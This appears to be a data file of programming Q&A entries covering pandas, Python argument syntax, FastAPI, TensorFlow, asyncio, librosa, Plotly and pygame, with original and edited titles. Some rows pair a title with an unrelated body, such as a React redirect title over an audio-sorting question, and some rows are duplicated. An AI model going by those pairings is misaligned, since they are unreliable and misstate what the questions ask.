Pandas dataframe stlyling: highlight some cells based on a format column," Problem descriptionI have a DataFrame in which last column is a format column. The purpose of this column is to contain the format of the DataFrame row.Here is an example of such a dataframe: Each df['format'] row contains a string intended to be taken as a list (when split) to give the format of the row.Symbols meaning:n means ""no highlight""y means ""to highlight in yellow""df['format'].to_list()[0] = 'n;y;n' means for example:n: first column ID item ""1"" not highlightedy: second column Status item ""to analyze"" to be highlightedn: third column Priority item ""P1"" not highlightedSo that expected outcome is:What I've triedI've tried to use df.format to get a list of lists containing the format needed. Here is my code: It doesn't work, and I get this output: <code>  df = pd.DataFrame({'ID': [1, 24, 31, 37], 'Status': ['to analyze', 'to analyze','to analyze','analyzed'], 'priority' : ['P1','P1','P2','P1'], 'format' : ['n;y;n','n;n;n','n;y;y','y;n;y']} import pandas as pdimport numpy as npdef highlight_case(df): list_of_format_lists = [] for format_line in df['format']: format_line_list = format_line.split(';') format_list = [] for form in format_line_list: if 'y' in form: format_list.append('background-color: yellow') else: format_list.append('') list_of_format_lists.append(format_list) list_of_format_lists = list(map(list, zip(*list_of_format_lists)))#transpose print(list_of_format_lists) return list_of_format_listshighlight_style = highlight_case(df)df.style.apply(highlight_style) TypeError Traceback (most recent call last)c:\python38\lib\site-packages\IPython\core\formatters.py in __call__(self, obj) 343 method = get_real_method(obj, self.print_method) 344 if method is not None:--> 345 return method() 346 return None 347 else:c:\python38\lib\site-packages\pandas\io\formats\style.py in _repr_html_(self) 191 Hooks into Jupyter notebook rich display system. 192 """"""--> 193 return self.render() 194 195 @doc(NDFrame.to_excel, klass=""Styler"")c:\python38\lib\site-packages\pandas\io\formats\style.py in render(self, **kwargs) 538 * table_attributes 539 """"""--> 540 self._compute() 541 # TODO: namespace all the pandas keys 542 d = self._translate()c:\python38\lib\site-packages\pandas\io\formats\style.py in _compute(self) 623 r = self 624 for func, args, kwargs in self._todo:--> 625 r = func(self)(*args, **kwargs) 626 return r 627 c:\python38\lib\site-packages\pandas\io\formats\style.py in _apply(self, func, axis, subset, **kwargs) 637 data = self.data.loc[subset] 638 if axis is not None:--> 639 result = data.apply(func, axis=axis, result_type=""expand"", **kwargs) 640 result.columns = data.columns 641 else:c:\python38\lib\site-packages\pandas\core\frame.py in apply(self, func, axis, raw, result_type, args, **kwds) 7543 kwds=kwds, 7544 )-> 7545 return op.get_result() 7546 7547 def applymap(self, func) -> ""DataFrame"":c:\python38\lib\site-packages\pandas\core\apply.py in get_result(self) 142 # dispatch to agg 143 if is_list_like(self.f) or is_dict_like(self.f):--> 144 return self.obj.aggregate(self.f, axis=self.axis, *self.args, **self.kwds) 145 146 # all emptyc:\python38\lib\site-packages\pandas\core\frame.py in aggregate(self, func, axis, *args, **kwargs) 7353 axis = self._get_axis_number(axis) 7354 -> 7355 relabeling, func, columns, order = reconstruct_func(func, **kwargs) 7356 7357 result = Nonec:\python38\lib\site-packages\pandas\core\aggregation.py in reconstruct_func(func, **kwargs) 74 75 if not relabeling:---> 76 if isinstance(func, list) and len(func) > len(set(func)): 77 78 # GH 28426 will raise error if duplicated function names are used andTypeError: unhashable type: 'list'",Pandas dataframe styling: highlight some cells based on a format column
"In a list of tuples, how to remove the set of tuples which have all its values in the same position as another tuple?"," I have a list of tuples, the list can vary in length between ~8 - 1000 depending on the length of the tuples. Each tuple in the list is unique. A tuple is of length N where each entry is a generic word.An example tuple can be of length N (Word 1, Word 2, Word 3, ..., Word N)For any tuple in the list, element j in said tuple will either be '' or Word jA very simplified example with alphabetic letters would be Every position at each tuple will either have the same value or be empty.I want to remove all the tuples which have all their non '' values in another tuple at the same position.As an example, (A,B,'','') has all its non '' values in (A,B,C,'') and should therefore be removed. The length of the tuples is always of the same length (not necessarily 4). The length of the tuples would be between 2-10.What is the fastest way to do this? <code>  l = [('A', 'B', '', ''), ('A', 'B', 'C', ''), ('', '', '', 'D'), ('A', '', '', 'D'), ('', 'B', '', '')] filtered_l = [(A,B,C,''),(A,'','',D)]",Efficiently remove partial duplicates in a list of tuples
"Python *args, **kwargs once again: why can't both args and keyword only arguments be mixed with *args and **kwargs simultaneously"," The usage of *args and **kwargs in python is clear to me and there are many questions out there in SO (eg Use of *args and **kwargs and What does ** (double star/asterisk) and * (star/asterisk) do for parameters?).But one thing I would like to understand is: why is it not possible to simultaneously define mandatory positional args, mandatory kwarg arguments and eventually still allow catching other args and kwargs as in cant_do_that below? Yes one could get rid of b in the could_do_this_but function's signature, perform (for instance) a kwargs.get(""b"", None) at the top of the function and raise some appropriate error if found None... but having ""b"" directly on the function signature would allow faster and more explicit code development employing the function down the road. <code>  def one_kwarg_is_mandatory(*, b, **kwargs): print(b) for key, value in kwargs.items(): print(key, value) def one_pos_arg_and_one_kwarg_are_mandatory(a, *, b, **kwargs): print(a, b) for key, value in kwargs.items(): print(key, value) # I wanted a mandatory arg (a) and possibly parse other args (*args), # then a mandatory kwarg (b) and eventually other kwargs (**kwargs)def cant_do_that(a, *args, *, b, **kwargs): print(a, b) print(args) for key, value in kwargs.items(): print(key, value)# not really interested on this because ""b"" must be a kwarg and hiding # it under **kwargs would not be explicit enough for my customer (sometimes myself ;))def could_do_this_but(a, b, *args, **kwargs): print(a, b) print(args) print(kwargs)",Why can't both args and keyword only arguments be mixed with *args and **kwargs simultaneously
How can I convert a numpy array to a matrix with counts of occurences?," I have the following numpy array: Is there a way to transform this array to a symmetric pandas Dataframe that contains the count of occurences for all possible combinations?I expect something along the lines of this: <code>  import numpy as nppair_array = np.array([(205, 254), (205, 382), (254, 382), (18, 69), (205, 382), (31, 183), (31, 267), (31, 382), (183, 267), (183, 382)])print(pair_array)#[[205 254]# [205 382]# [254 382]# [ 18 69]# [205 382]# [ 31 183]# [ 31 267]# [ 31 382]# [183 267]# [183 382]] # 18 31 69 183 205 254 267 382 # 18 0 0 1 0 0 0 0 0# 31 0 0 0 1 0 0 1 1# 69 1 0 0 0 0 0 0 0# 183 0 1 0 0 0 0 1 1# 205 0 0 0 0 0 1 0 2# 254 0 0 0 0 1 0 0 1# 267 0 1 0 1 0 0 0 0# 382 0 1 0 1 2 1 0 0",How can I convert a two column array to a matrix with counts of occurences?
FastAPI - How to use HTTPExcetion in responses?," The documentation suggests raising an HTTPException with client errors, which is great.But how can I show those specific errors in the documentation following HTTPException's model? Meaning a dict with the ""detail"" key.The following does not work because HTTPException is not a Pydantic model. <code>  @app.get( '/test', responses={ 409 : { 'model' : HTTPException, 'description': 'This endpoint always raises an error' } })def raises_error(): raise HTTPException(409, detail='Error raised')",FastAPI - How to use HTTPException in responses?
how to use tensorflow rewrite pytorch torch.nn.functional.unfold function?," I want to use tensorflow to rewrite the pytorch's torch.nn.functional.unfold function: I tried to use the function tf.extract_image_patches():x = tf.extract_image_patches(x,ksizes=[1, 1,5, 98],strides=[1, 1, 3, 1], rates=[1, 1, 1, 1],padding='VALID')The input x.shape:[16,1,64,98]I get the output x.shape:[16,1,20,490]Then I reshape the X to [16,490,20], that was I expect.But I get the error when I feed the data: How could I use tensorflow to rewrite pytorch torch.nn.functional.unfold function to change the X? <code>  #input x:[16, 1, 50, 36]x = torch.nn.functional.unfold(x, kernel_size=(5, 36), stride=3)#output x:[16, 180, 16] UnimplementedError (see above for traceback): Only support ksizes across space.[[Node:hcn/ExtractImagePatches = ExtractImagePatches[T=DT_FLOAT, ksizes=[1, 1, 5, 98], padding=""VALID"", rates=[1, 1, 1, 1], strides=[1, 1, 3, 1], _device=""/job:localhost/replica:0/task:0/device:GPU:0""](hcn/Reshape)]]",How to replicate PyTorch's nn.functional.unfold function in Tensorflow?
Will `run_in_executor` ever block?," suppose if I have a web server like this: As I understand, the code will spawn another thread in the default ThreadExecutorPool and then execute the blocking function in the thread pool. On the other side, thinking about how the GIL works, the CPython interpreter will only execute a thread for 100 ticks and then it will switch to another thread to be fair and give other threads a chance to progress. In this case, what if the Python interpreter decides to switch to the threads where the blocking_function is executing? Will it block the who interpreter to wait for whatever remaining on the time.sleep(5)?The reason I am asking this is that I have observed sometimes my application will block on the blocking_function, however I am not entirely sure what's in play here as my blocking_function is quite special -- it talks to a COM API object through the win32com library. I am trying to rule out that this is some GIL pitfalls I am falling into. <code>  from fastapi import FastAPIimport uvicornimport asyncioapp = FastAPI()def blocking_function(): import time time.sleep(5) return 42@app.get(""/"")async def root(): loop = asyncio.get_running_loop() result = await loop.run_in_executor(None, blocking_function) return result@app.get(""/ok"")async def ok(): return {""ok"": 1}if __name__ == ""__main__"": uvicorn.run(app, host=""0.0.0.0"", workers=1)",Will run_in_executor ever block?
Redirect to another page on form submit in react," ExplanationI want to be able to sort a collection of sounds in a list based on the timbre(tone) of the sound. Here is a toy example where I manually sorted the spectrograms for 12 sound files that I created and uploaded to this repo. I know that these are sorted correctly because the sound produced for each file, is exactly the same as the sound in the file before it, but with one effect or filter added to it.For example, a correct sorting of sounds x, y and z wheresounds x and y are the same, but y has a distortion effectsounds y and z are the same, but z filters out high frequenciessounds x and z are the same, but z has a distortion effect, and z filters out high frequenciesWould be x, y, zJust by looking at the spectrograms, I can see some visual indicators that hint at how the sounds should be sorted, but I would like to automate the sorting process by having a computer recognize such indicators.The sound files for the sounds in the image aboveare all the same lengthall the same note/pitchall start at exactly the same time.all the same amplitude (level of loudness)I would like my sorting to work even if all of these conditions are not true(but I'll accept the best answer even if it doesn't solve this)For example, in the image belowthe start of MFCC_8 is shifted in comparison to MFCC_8 in the first imageMFCC_9 is identical to MFCC_9 in the first image, but is duplicated (so it is twice as long)If MFCC_8 and MFCC_9 in the first image were replaced with MFCC_8 and MFCC_9 in the image below, I would like the sorting of sounds to remain the exact same.For my real program, I intend to break up an mp3 file by sound changes like thisMy program so farHere is the program which produces the first image in this post. I need the code in the function sort_sound_files to be replaced with some code that actually sorts the sound files based on timbre. The part which needs to be done is near the bottom and the sound files on on this repo. I also have this code in a jupyter notebook, which also includes a second example that is more similar to what I actually want this program to do EDITI didn't realize this until later, but another pretty important thing is that there's going to be lot's of properties that are oscillating. The difference between sound 5 and sound 6 from the first set for example is that sound 6 is sound 5 but with oscillation on the volume (an LFO), this type of oscillation can be placed on a frequency filter, an effect (like distortion) or even pitch. I realize this makes the problem a lot trickier and it's outside the scope of what I asked. Do you have any advice? I could even use several different sorts, and only look at one property at one time. <code>  import librosaimport librosa.displayimport matplotlib.pyplot as pltimport numpy as npimport mathfrom os import pathfrom typing import Listclass Spec: name: str = '' sr: int = 44100class MFCC(Spec): mfcc: np.ndarray # Mel-frequency cepstral coefficient delta_mfcc: np.ndarray # delta Mel-frequency cepstral coefficient delta2_mfcc: np.ndarray # delta2 Mel-frequency cepstral coefficient n_mfcc: int = 13 def __init__(self, soundFile: str): self.name = path.basename(soundFile) y, sr = librosa.load(soundFile, sr=self.sr) self.mfcc = librosa.feature.mfcc(y, n_mfcc=self.n_mfcc, sr=sr) self.delta_mfcc = librosa.feature.delta(self.mfcc, mode=""nearest"") self.delta2_mfcc = librosa.feature.delta(self.mfcc, mode=""nearest"", order=2)def get_mfccs(sound_files: List[str]) -> List[MFCC]: ''' :param sound_files: Each item is a path to a sound file (wav, mp3, ...) ''' mfccs = [MFCC(sound_file) for sound_file in sound_files] return mfccsdef draw_specs(specList: List[Spec], attribute: str, title: str): ''' Takes a list of same type audio features, and draws a spectrogram for each one ''' def draw_spec(spec: Spec, attribute: str, fig: plt.Figure, ax: plt.Axes): img = librosa.display.specshow( librosa.amplitude_to_db(getattr(spec, attribute), ref=np.max), y_axis='log', x_axis='time', ax=ax ) ax.set_title(title + str(spec.name)) fig.colorbar(img, ax=ax, format=""%+2.0f dB"") specLen = len(specList) fig, axs = plt.subplots(math.ceil(specLen/3), 3, figsize=(30, specLen * 2)) for spec in range(0, len(specList), 3): draw_spec(specList[spec], attribute, fig, axs.flat[spec]) if (spec+1 < len(specList)): draw_spec(specList[spec+1], attribute, fig, axs.flat[spec+1]) if (spec+2 < len(specList)): draw_spec(specList[spec+2], attribute, fig, axs.flat[spec+2])sound_files_1 = [ '../assets/transients_1/4.wav', '../assets/transients_1/6.wav', '../assets/transients_1/1.wav', '../assets/transients_1/11.wav', '../assets/transients_1/13.wav', '../assets/transients_1/9.wav', '../assets/transients_1/3.wav', '../assets/transients_1/7.wav', '../assets/transients_1/12.wav', '../assets/transients_1/2.wav', '../assets/transients_1/5.wav', '../assets/transients_1/10.wav', '../assets/transients_1/8.wav']mfccs_1 = get_mfccs(sound_files_1)##################################################################def sort_sound_files(sound_files: List[str]): # TODO: Complete this function. The soundfiles must be sorted based on the content in the file, do not use the name of the file # This is the correct order that the sounds should be sorted in return [f""../assets/transients_1/{num}.wav"" for num in range(1, 14)] # TODO: remove(or comment) once method is completed##################################################################sorted_sound_files_1 = sort_sound_files(sound_files_1)mfccs_1 = get_mfccs(sorted_sound_files_1)draw_specs(mfccs_1, 'mfcc', ""Transients_1 Sorted MFCC-"")plt.savefig('sorted_sound_spectrograms.png')",Sort sounds by similarity based on timbre(tone)
Compare the similarity of 2 sounds using Python Librosa," ExplanationI want to be able to sort a collection of sounds in a list based on the timbre(tone) of the sound. Here is a toy example where I manually sorted the spectrograms for 12 sound files that I created and uploaded to this repo. I know that these are sorted correctly because the sound produced for each file, is exactly the same as the sound in the file before it, but with one effect or filter added to it.For example, a correct sorting of sounds x, y and z wheresounds x and y are the same, but y has a distortion effectsounds y and z are the same, but z filters out high frequenciessounds x and z are the same, but z has a distortion effect, and z filters out high frequenciesWould be x, y, zJust by looking at the spectrograms, I can see some visual indicators that hint at how the sounds should be sorted, but I would like to automate the sorting process by having a computer recognize such indicators.The sound files for the sounds in the image aboveare all the same lengthall the same note/pitchall start at exactly the same time.all the same amplitude (level of loudness)I would like my sorting to work even if all of these conditions are not true(but I'll accept the best answer even if it doesn't solve this)For example, in the image belowthe start of MFCC_8 is shifted in comparison to MFCC_8 in the first imageMFCC_9 is identical to MFCC_9 in the first image, but is duplicated (so it is twice as long)If MFCC_8 and MFCC_9 in the first image were replaced with MFCC_8 and MFCC_9 in the image below, I would like the sorting of sounds to remain the exact same.For my real program, I intend to break up an mp3 file by sound changes like thisMy program so farHere is the program which produces the first image in this post. I need the code in the function sort_sound_files to be replaced with some code that actually sorts the sound files based on timbre. The part which needs to be done is near the bottom and the sound files on on this repo. I also have this code in a jupyter notebook, which also includes a second example that is more similar to what I actually want this program to do EDITI didn't realize this until later, but another pretty important thing is that there's going to be lot's of properties that are oscillating. The difference between sound 5 and sound 6 from the first set for example is that sound 6 is sound 5 but with oscillation on the volume (an LFO), this type of oscillation can be placed on a frequency filter, an effect (like distortion) or even pitch. I realize this makes the problem a lot trickier and it's outside the scope of what I asked. Do you have any advice? I could even use several different sorts, and only look at one property at one time. <code>  import librosaimport librosa.displayimport matplotlib.pyplot as pltimport numpy as npimport mathfrom os import pathfrom typing import Listclass Spec: name: str = '' sr: int = 44100class MFCC(Spec): mfcc: np.ndarray # Mel-frequency cepstral coefficient delta_mfcc: np.ndarray # delta Mel-frequency cepstral coefficient delta2_mfcc: np.ndarray # delta2 Mel-frequency cepstral coefficient n_mfcc: int = 13 def __init__(self, soundFile: str): self.name = path.basename(soundFile) y, sr = librosa.load(soundFile, sr=self.sr) self.mfcc = librosa.feature.mfcc(y, n_mfcc=self.n_mfcc, sr=sr) self.delta_mfcc = librosa.feature.delta(self.mfcc, mode=""nearest"") self.delta2_mfcc = librosa.feature.delta(self.mfcc, mode=""nearest"", order=2)def get_mfccs(sound_files: List[str]) -> List[MFCC]: ''' :param sound_files: Each item is a path to a sound file (wav, mp3, ...) ''' mfccs = [MFCC(sound_file) for sound_file in sound_files] return mfccsdef draw_specs(specList: List[Spec], attribute: str, title: str): ''' Takes a list of same type audio features, and draws a spectrogram for each one ''' def draw_spec(spec: Spec, attribute: str, fig: plt.Figure, ax: plt.Axes): img = librosa.display.specshow( librosa.amplitude_to_db(getattr(spec, attribute), ref=np.max), y_axis='log', x_axis='time', ax=ax ) ax.set_title(title + str(spec.name)) fig.colorbar(img, ax=ax, format=""%+2.0f dB"") specLen = len(specList) fig, axs = plt.subplots(math.ceil(specLen/3), 3, figsize=(30, specLen * 2)) for spec in range(0, len(specList), 3): draw_spec(specList[spec], attribute, fig, axs.flat[spec]) if (spec+1 < len(specList)): draw_spec(specList[spec+1], attribute, fig, axs.flat[spec+1]) if (spec+2 < len(specList)): draw_spec(specList[spec+2], attribute, fig, axs.flat[spec+2])sound_files_1 = [ '../assets/transients_1/4.wav', '../assets/transients_1/6.wav', '../assets/transients_1/1.wav', '../assets/transients_1/11.wav', '../assets/transients_1/13.wav', '../assets/transients_1/9.wav', '../assets/transients_1/3.wav', '../assets/transients_1/7.wav', '../assets/transients_1/12.wav', '../assets/transients_1/2.wav', '../assets/transients_1/5.wav', '../assets/transients_1/10.wav', '../assets/transients_1/8.wav']mfccs_1 = get_mfccs(sound_files_1)##################################################################def sort_sound_files(sound_files: List[str]): # TODO: Complete this function. The soundfiles must be sorted based on the content in the file, do not use the name of the file # This is the correct order that the sounds should be sorted in return [f""../assets/transients_1/{num}.wav"" for num in range(1, 14)] # TODO: remove(or comment) once method is completed##################################################################sorted_sound_files_1 = sort_sound_files(sound_files_1)mfccs_1 = get_mfccs(sorted_sound_files_1)draw_specs(mfccs_1, 'mfcc', ""Transients_1 Sorted MFCC-"")plt.savefig('sorted_sound_spectrograms.png')",Sort sounds by similarity based on timbre(tone)
How to add volume to plot candlestick chart?," code: The above code is ok.But now I want to 'volume' in this candlestick chartcode: error:ValueError: Invalid property specified for object of typeplotly.graph_objs.Candlestick: 'volume' <code>  from plotly.offline import init_notebook_mode, iplot, iplot_mpl def plot_train_test(train, test, date_split): data = [Candlestick(x=train.index, open=train['open'], high=train['high'], low=train['low'], close=train['close'],name='train'), Candlestick(x=test.index, open=test['open'], high=test['high'], low=test['low'], close=test['close'],name='test') ] layout = { 'shapes': [ {'x0': date_split, 'x1': date_split, 'y0': 0, 'y1': 1, 'xref': 'x', 'yref': 'paper', 'line': {'color': 'rgb(0,0,0)', 'width': 1}}], 'annotations': [{'x': date_split, 'y': 1.0, 'xref': 'x', 'yref': 'paper', 'showarrow': False, 'xanchor': 'left','text': ' test data'}, {'x': date_split, 'y': 1.0, 'xref': 'x', 'yref': 'paper', 'showarrow': False, 'xanchor': 'right', 'text': 'train data '}] } figure = Figure(data=data, layout=layout) iplot(figure) from plotly.offline import init_notebook_mode, iplot, iplot_mpl def plot_train_test(train, test, date_split): data = [Candlestick(x=train.index, open=train['open'], high=train['high'], low=train['low'], close=train['close'],volume=train['volume'],name='train'), Candlestick(x=test.index, open=test['open'], high=test['high'], low=test['low'],close=test['close'],volume=test['volume'],name='test')] layout = { 'shapes': [ {'x0': date_split, 'x1': date_split, 'y0': 0, 'y1': 1, 'xref': 'x', 'yref': 'paper', 'line': {'color': 'rgb(0,0,0)', 'width': 1}} ], 'annotations': [ {'x': date_split, 'y': 1.0, 'xref': 'x', 'yref': 'paper', 'showarrow': False, 'xanchor': 'left', 'text': ' test data'}, {'x': date_split, 'y': 1.0, 'xref': 'x', 'yref': 'paper', 'showarrow': False, 'xanchor': 'right', 'text': 'train data '} ] } figure = Figure(data=data, layout=layout) iplot(figure) ",Plotly: How to add volume to a candlestick chart
Plotly: How to add volume to a candlestick chart?," code: The above code is ok.But now I want to 'volume' in this candlestick chartcode: error:ValueError: Invalid property specified for object of typeplotly.graph_objs.Candlestick: 'volume' <code>  from plotly.offline import init_notebook_mode, iplot, iplot_mpl def plot_train_test(train, test, date_split): data = [Candlestick(x=train.index, open=train['open'], high=train['high'], low=train['low'], close=train['close'],name='train'), Candlestick(x=test.index, open=test['open'], high=test['high'], low=test['low'], close=test['close'],name='test') ] layout = { 'shapes': [ {'x0': date_split, 'x1': date_split, 'y0': 0, 'y1': 1, 'xref': 'x', 'yref': 'paper', 'line': {'color': 'rgb(0,0,0)', 'width': 1}}], 'annotations': [{'x': date_split, 'y': 1.0, 'xref': 'x', 'yref': 'paper', 'showarrow': False, 'xanchor': 'left','text': ' test data'}, {'x': date_split, 'y': 1.0, 'xref': 'x', 'yref': 'paper', 'showarrow': False, 'xanchor': 'right', 'text': 'train data '}] } figure = Figure(data=data, layout=layout) iplot(figure) from plotly.offline import init_notebook_mode, iplot, iplot_mpl def plot_train_test(train, test, date_split): data = [Candlestick(x=train.index, open=train['open'], high=train['high'], low=train['low'], close=train['close'],volume=train['volume'],name='train'), Candlestick(x=test.index, open=test['open'], high=test['high'], low=test['low'],close=test['close'],volume=test['volume'],name='test')] layout = { 'shapes': [ {'x0': date_split, 'x1': date_split, 'y0': 0, 'y1': 1, 'xref': 'x', 'yref': 'paper', 'line': {'color': 'rgb(0,0,0)', 'width': 1}} ], 'annotations': [ {'x': date_split, 'y': 1.0, 'xref': 'x', 'yref': 'paper', 'showarrow': False, 'xanchor': 'left', 'text': ' test data'}, {'x': date_split, 'y': 1.0, 'xref': 'x', 'yref': 'paper', 'showarrow': False, 'xanchor': 'right', 'text': 'train data '} ] } figure = Figure(data=data, layout=layout) iplot(figure) ",Plotly: How to add volume to a candlestick chart
Display different color segments on line chart if value falls below or above a certain threshold (Python and Plotly)," I have a multi-line graph that displays percent increase over time. I'd like to set a threshold in my code to have an upper and lower bound. If the line falls outside these bounds, I'd like that specific part of the line graph to be a different color than its parent.This is what I am doing: This is the visual result:Let me zoom in on one line to better explain:I would like a threshold set for each id, and if the line goes above or below this threshold, the color will be different for that part of the line graph. For instance:The upper bound for id IAA may be 5 and the lower bound for IAA may be 0.Any value that is over 5 , or below 0, show be highlighted a specific color.The upper bound for id SSS may be 10 and the lower bound for SSS may be 3Any value that is over 10, or below 3, should be highlighted a specific color.I am wanting the thresholds to be for each idPlease see below:The highlighted yellow parts of the line reflect where the line graph has exceeded or decreased a set threshold. Is this possible to do this using Plotly?Here is the raw data example: Updated: Any suggestions is appreciatedUpdateIs there a way to make the full line display the marker dots on them?I have tried this: mode = 'markers+lines' but did not get the desired result: Updated Question:Also,is there a way to add the Date and Percent titles on the hover annotation here?. I am researching the Plotly docs.[![enter image description here][4]][4] <code>  import plotly.express as pximport plotly.graph_objects as gofig = px.line(df14, x = ""Date"", y = ""Percent"", color = ""id"", title = ""id Growth in Percentage (US)"", labels = {""Percent"": ""Percent Growth""})fig.update_layout(font_family=""Arial"",font_color=""black"",title_font_family=""Arial"",title_font_color=""black"",legend_title_font_color=""black"" #style the text (legend, title etc))fig.update_xaxes(title_font_family=""Arial"") #style ance center titlefig.update_layout(title={ 'text': ""id Growth Percentage in US (Line Graph)"", 'y':0.9, 'x':0.5, 'xanchor': 'center', 'yanchor': 'top'})fig.update_traces(mode='markers+lines') #add dots to linefig.show() id Start End Diff Percent Date IAA 4/1/2019 5/1/2019 160.4279 11.10809 04-01-2019 to 05-01-2019 IAA 5/1/2019 6/1/2019 136.0248 8.476798 05-01-2019 to 06-01-2019 IAA 6/1/2019 7/1/2019 174.0513 9.998946 06-01-2019 to 07-01-2019 IAA 7/1/2019 8/1/2019 112.0424 5.851551 07-01-2019 to 08-01-2019 IAA 8/1/2019 9/1/2019 141.8488 6.998691 08-01-2019 to 09-01-2019 IAA 9/1/2019 10/1/2019 103.5522 4.774984 09-01-2019 to 10-01-2019 IAA 10/1/2019 11/1/2019 125.6087 5.528085 10-01-2019 to 11-01-2019 IAA 11/1/2019 12/1/2019 145.2591 6.058016 11-01-2019 to 12-01-2019 IAA 12/1/2019 1/1/2020 115.5121 4.542251 12-01-2019 to 01-01-2020 IAA 1/1/2020 2/1/2020 185.7191 6.985673 01-01-2020 to 02-01-2020 IAA 2/1/2020 3/1/2020 126.7386 4.455896 02-01-2020 to 03-01-2020 IAA 3/1/2020 4/1/2020 231.3461 7.786734 03-01-2020 to 04-01-2020 IAA 4/1/2020 5/1/2020 97.02587 3.02981 04-01-2020 to 05-01-2020 IAA 5/1/2020 6/1/2020 42.85235 1.298792 05-01-2020 to 06-01-2020 IAA 6/1/2020 7/1/2020 124.666 3.729997 06-01-2020 to 07-01-2020 IAA 7/1/2020 8/1/2020 357.9974 10.32609 07-01-2020 to 08-01-2020 IAA 8/1/2020 9/1/2020 490.9587 12.8358 08-01-2020 to 09-01-2020 IAA 9/1/2020 10/1/2020 204.5478 4.739428 09-01-2020 to 10-01-2020 IAA 10/1/2020 11/1/2020 287.6025 6.362292 10-01-2020 to 11-01-2020 SSStest 4/1/2019 5/1/2019 12.38486 5.780551 04-01-2019 to 05-01-2019 SSStest 5/1/2019 6/1/2019 -2.61735 -1.15487 05-01-2019 to 06-01-2019 SSStest 6/1/2019 7/1/2019 -5.6187 -2.50814 06-01-2019 to 07-01-2019 SSStest 7/1/2019 8/1/2019 3.204252 1.467153 07-01-2019 to 08-01-2019 SSStest 8/1/2019 9/1/2019 -25.3782 -11.4521 08-01-2019 to 09-01-2019 SSStest 9/1/2019 10/1/2019 -10.9717 -5.59137 09-01-2019 to 10-01-2019 **Update, I have figured this out:** fig.update_traces(mode='markers+lines') ",Plotly: How to display different color segments on a line chart for specified thresholds?
Pygame Bubble Sprite Dispears Way To Fast When Colliding How To Fix?," I am trying to make a tic tak toe game with pygame and I was wondering how would I do the logic here is what I have so far. VIDEO < I only have it when I click on the middle button it will display the player 2 x on the screen and then the image that is hovering over my mouse will turn into O for player 1 turn to go BUT my question is how would I do the logic like if player 1 gets 3 in a row or player 2 gets 3 across in a row I am really confused on this and I need someone to walk me throw itmy tic tak toe game right now CODE the assets I am using Please! use so when your testing out the code <code>  import pygame,randompygame.init()# draw our windowwindow = pygame.display.set_mode((500,540),pygame.NOFRAME)pygame.display.set_caption(""Tic Tac TOE"")MANUAL_CURSOR = pygame.image.load('nw.png').convert_alpha()MANUAL_CURSOR2 = pygame.image.load('nOW.png').convert_alpha()bg = pygame.image.load(""ticO.png"")fps = 40clock = pygame.time.Clock()class button(): def __init__(self, color, x,y,width,height, text=''): self.color = color self.x = x self.y = y self.width = width self.height = height self.text = text self.over = False def draw(self,window,outline=None): #Call this method to draw the button on the screen if outline: pygame.draw.rect(window, outline, (self.x-2,self.y-2,self.width+4,self.height+4),0) pygame.draw.rect(window, self.color, (self.x,self.y,self.width,self.height),0) if self.text != '': font = pygame.font.SysFont('comicsans', 60) text = font.render(self.text, 1, (0,0,0)) window.blit(text, (self.x + (self.width/2 - text.get_width()/2), self.y + (self.height/2 - text.get_height()/2))) def isOver(self, pos): #Pos is the mouse position or a tuple of (x,y) coordinates if pos[0] > self.x and pos[0] < self.x + self.width: if pos[1] > self.y and pos[1] < self.y + self.height: return True return False def playSoundIfMouseIsOver(self, pos, sound): if self.isOver(pos): if not self.over: beepsound.play() self.over = True else: self.over = Falseclass particle: def __init__(self,x): self.x = x self.partilight = pygame.image.load(""noW.png"") def draw(self,window): window.blit(self.partilight,(self.x)) white = (250,250,250)greenbutton2 = button((0,255,0),190,215,100,100, '')greenbutton3 = button((0,255,0),335,215,100,100, '')greenbutton4 = button((0,255,0),70,215,100,100, '')greenbutton5 = button((0,255,0),70,350,100,100, '')greenbutton6 = button((0,255,0),190,350,100,100, '')greenbutton7 = button((0,255,0),335,350,100,100, '')greenbutton8 = button((0,255,0),70,90,100,100, '')greenbutton9 = button((0,255,0),190,90,100,100, '')greenbutton10 = button((0,255,0),335,90,100,100, '') font = pygame.font.Font(""fos.ttf"", 60)score = 1cointext = font.render("""" + str(score), True, (255,255,255))coinrect = cointext.get_rect()coinrect.center = ((100,50))particles = []pos = pygame.mouse.get_pos()def redraw(): window.fill((174, 214, 241)) window.blit(bg,(0,0)) greenbutton2.draw(window) greenbutton3.draw(window) greenbutton4.draw(window) greenbutton5.draw(window) greenbutton6.draw(window) greenbutton7.draw(window) greenbutton8.draw(window) greenbutton9.draw(window) greenbutton10.draw(window) for particle in particles: particle.draw(window) pos = pygame.mouse.get_pos() if score >= 0: window.blit(MANUAL_CURSOR, MANUAL_CURSOR.get_rect(center = pygame.mouse.get_pos())) pygame.mouse.set_visible(False) if score >= 1: window.blit(MANUAL_CURSOR2, MANUAL_CURSOR2.get_rect(center = pygame.mouse.get_pos())) if score >= 2: window.blit(MANUAL_CURSOR, MANUAL_CURSOR.get_rect(center = pygame.mouse.get_pos())) if score >= 3: window.blit(MANUAL_CURSOR2, MANUAL_CURSOR2.get_rect(center = pygame.mouse.get_pos())) if score >= 4: window.blit(MANUAL_CURSOR, MANUAL_CURSOR.get_rect(center = pygame.mouse.get_pos())) if score >= 5: window.blit(MANUAL_CURSOR2, MANUAL_CURSOR2.get_rect(center = pygame.mouse.get_pos())) if score >= 6: window.blit(MANUAL_CURSOR, MANUAL_CURSOR.get_rect(center = pygame.mouse.get_pos())) if score >= 7: window.blit(MANUAL_CURSOR2, MANUAL_CURSOR2.get_rect(center = pygame.mouse.get_pos())) if score >= 8: window.blit(MANUAL_CURSOR, MANUAL_CURSOR.get_rect(center = pygame.mouse.get_pos())) # our main looprunninggame = Truewhile runninggame: clock.tick(fps) for event in pygame.event.get(): if event.type == pygame.QUIT: runninggame = False if event.type == pygame.MOUSEBUTTONDOWN: pos = pygame.mouse.get_pos() if greenbutton2.isOver(pos): score += 1 cointext = font.render("""" + str(score), True, (255,255,255)) coinrect.center = ((100,50)) for x in range(4): particles.append(particle(MANUAL_CURSOR.get_rect(center = pygame.mouse.get_pos()))) redraw() pygame.display.update()pygame.quit() ",Pygame Tic Tak Toe Logic? How Would I Do It
